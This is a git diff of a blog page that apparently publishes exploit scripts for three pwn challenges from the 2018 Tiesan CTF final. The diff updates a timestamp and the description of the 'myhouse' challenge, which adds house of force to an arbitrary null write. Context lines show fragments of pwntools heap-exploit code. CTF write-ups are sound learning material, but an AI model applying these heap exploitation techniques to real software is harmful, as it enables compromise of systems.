@@ -18,7 +18,7 @@
 <meta property="og:url" content="http://Reshahar.github.io/2018/12/12/2018铁三赛决赛三道pwn题exp/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
 <meta property="og:description" content="2018铁三赛决赛三道pwn题exp">
-<meta property="og:updated_time" content="2018-12-12T15:08:38.959Z">
+<meta property="og:updated_time" content="2018-12-12T15:12:41.241Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2018铁三赛决赛三道pwn题exp">
 <meta name="twitter:description" content="2018铁三赛决赛三道pwn题exp">
@@ -271,7 +271,7 @@ if __name__ == &apos;__main__&apos;:
     add(&apos;A&apos;*0x10,0x20,p64(0)+p64(0x400c70)+p64(one)) 
     et()
     p.interactive()
-</code></pre><h3 id="0x03-myhouse"><a href="#0x03-myhouse" class="headerlink" title="0x03 myhouse"></a>0x03 myhouse</h3><p>一个任意地址写null漏洞</p>
+</code></pre><h3 id="0x03-myhouse"><a href="#0x03-myhouse" class="headerlink" title="0x03 myhouse"></a>0x03 myhouse</h3><p>一个任意地址写null漏洞和house of force</p>
 <pre><code>from pwn import *
 
 def ru(data,drop=False):
